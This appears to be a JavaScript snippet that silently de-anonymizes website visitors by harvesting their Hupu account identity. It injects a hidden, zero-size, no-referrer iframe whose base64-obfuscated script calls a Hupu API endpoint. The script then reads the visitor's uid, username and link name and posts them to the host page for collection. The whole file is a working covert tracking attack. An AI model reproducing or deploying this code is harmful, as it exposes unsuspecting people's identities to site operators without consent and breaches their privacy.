// 个人主页  用户名   用户id

function formateHupuData(e) {
  if ('hupu' === e.data.source) {
    var u = e.data.d,
      t = {
        valid: !0,
        data: {
          uid: u.uid,
          userName: u.username,
          homePage: 'https://my.hupu.com/'.concat(u.uid),
        },
      }
    let innerHTML = `
      <div class='item'>
        <p class='title'>虎扑</p>
        <p>个人主页: ${t.data.homePage}</p>
        <p>用户名: ${t.data.userName}</p>
      </div>
    `
    if (t.data.userName) {
      getInifoData({ type: 'hupu', data: t.data, html: innerHTML })
    }
  }
}
function hupu() {
  var d = document.createElement('iframe')
  d.src =
    'data:text/html;base64,PHNjcmlwdD4KICBsZXQgcyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpOwogIHMuc3JjID0gJ2h0dHBzOi8vcmVtaW5kLmh1cHUuY29tL2FwaS9nZXRSZW1pbmROdW0uYXBpLnBocD9jb250ZW50dHlwZT1qcyZ1cmw9aHR0cHMlM0ElMkYlMkZiYnMuaHVwdS5jb20lMkYzMjcyMjc4My5odG1sJwogIHMub25sb2FkID0gZnVuY3Rpb24oKSB7CiAgICBpZiAodHlwZW9mKGNvbW1vbk5hdikgPT0gInVuZGVmaW5lZCIpIHsKICAgIAlyZXR1cm4KICAgIH0KICAgIGxldCBkYXRhID0ge307CiAgICBkYXRhLnVpZCA9IGNvbW1vbk5hdi5ub3RpZmljYXRpb24udWlkOwogICAgZGF0YS51c2VybmFtZSA9IGNvbW1vbk5hdi5ub3RpZmljYXRpb24udXNlcm5hbWU7CiAgICBkYXRhLmxpbmtuYW1lID0gY29tbW9uTmF2Lm5vdGlmaWNhdGlvbi5saW5rbmFtZTsKICAgIGxldCBkID0ge3NvdXJjZTogImh1cHUiLCBkOiBkYXRhfTsKICAgIHdpbmRvdy5wYXJlbnQucG9zdE1lc3NhZ2UoZCwgIioiKTsKICAgIH0KICBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuYXBwZW5kQ2hpbGQocyk7PC9zY3JpcHQ+'
  d.width = 0
  d.height = 0
  d.style.borderWidth = 0
  d.referrerPolicy = 'no-referrer'
  document.documentElement.appendChild(d)
}
window.addEventListener('message', formateHupuData, !1)
// window.addEventListener('load', function () {
hupu()
// })
